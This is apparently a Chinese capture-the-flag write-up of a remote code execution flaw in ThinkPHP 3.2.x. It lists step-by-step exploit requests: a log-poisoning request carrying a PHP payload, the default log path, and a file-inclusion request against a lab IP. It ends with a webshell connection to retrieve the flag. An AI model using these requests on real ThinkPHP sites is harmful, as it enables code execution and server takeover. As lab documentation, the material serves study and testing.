#ThinkPHP 3.2.x远程代码执行
##漏洞描述
ThinkPHP的远程代码执行漏洞是在受影响的版本中，业务代码中如果模板赋值方法assign的第一个参数可控，则可导致模板文件路径变量被覆盖为携带攻击代码的文件路径，造成任意文件包含，执行任意代码。

##影响版本
ThinkPHP3.2.x

##利用流程
1.访问地址：118.193.36.37:59521
2.写入攻击代码到日志中。错误请求系统报错：
```
118.193.36.37:59521/index.php?m=--><?=phpinfo();?>
```
3.日志文件路径（这里是默认配置的log文件路径，ThinkPHP的日志路径和日期相关）：
```
\Application\Runtime\Logs\Common\21_07_20.log
```
4.构造攻击请求：
```
118.193.36.37:59521/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/21_07_20.log
```
5.蚁剑连接 测试成功 但无法访问 传入phpinfo Ctrl+g得到flag
